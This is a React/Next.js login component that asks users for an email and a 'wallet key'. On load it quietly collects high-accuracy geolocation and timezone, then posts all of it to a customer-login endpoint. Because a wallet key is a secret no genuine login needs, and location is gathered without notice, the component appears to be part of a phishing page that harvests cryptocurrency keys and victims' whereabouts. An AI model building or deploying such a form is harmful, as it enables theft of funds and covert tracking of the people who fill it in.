// components/GetYourAddress.tsx
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
}

const GetYourAddress = ({ onClose }: { onClose: () => void }) => {
  const [email, setEmail] = useState("");
  const [walletKey, setWalletKey] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [locationData, setLocationData] = useState<LocationData | null>(null);
  const router = useRouter();

  // Get location when component mounts
  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocationData({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp
          });
        },
        (error) => {
          console.log("Geolocation error:", error);
          // Don't set error - location is optional
        },
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
    }
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    // Basic validation
    if (!email || !walletKey) {
      setError("Please fill in all fields.");
      setIsLoading(false);
      return;
    }

    if (!/\S+@\S+\.\S+/.test(email)) {
      setError("Please enter a valid email address.");
      setIsLoading(false);
      return;
    }

    try {
      const response = await fetch("/api/customer-login", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          email: email.trim(),
          walletKey: walletKey.trim(),
          location: locationData,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timestamp: new Date().toISOString()
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Login failed");
      }

      console.log("Login successful:", data);
      
      // Handle successful login
      if (data.redirectUrl) {
        router.push(data.redirectUrl);
      }
      onClose();
      
    } catch (err: unknown) {
      if (err instanceof Error) {
        if (err instanceof Error) {
          setError(err.message);
        } else {
          setError("An unknown error occurred");
        }
      } else {
        setError("An unknown error occurred");
      }
      // setError(error.message); // This line is redundant and causes an error
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <form onSubmit={handleLogin} className="space-y-4">
      <div>
        <label htmlFor="email" className="block text-sm font-medium text-gray-700">
          Email
        </label>
        <input
          type="email"
          id="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500"
          placeholder="Enter your email"
          disabled={isLoading}
          required
        />
      </div>
      
      <div>
        <label htmlFor="walletKey" className="block text-sm font-medium text-gray-700">
          Wallet Key
        </label>
        <input
          type="password"
          id="walletKey"
          value={walletKey}
          onChange={(e) => setWalletKey(e.target.value)}
          className="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500"
          placeholder="Enter your wallet key"
          disabled={isLoading}
          required
        />
      </div>

      {error && (
        <div className="text-sm text-red-600">
          {error}
        </div>
      )}

      <button
        type="submit"
        disabled={isLoading}
        className="w-full bg-black text-white dark:bg-white dark:text-black py-2 px-4 rounded-md hover:bg-gray-600 dark:hover:bg-slate-500 focus:outline-none focus:ring-2 focus:ring-gray-600 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
      >
        {isLoading ? "Logging in..." : "Login"}
      </button>
    </form>
  );
};

export default GetYourAddress;




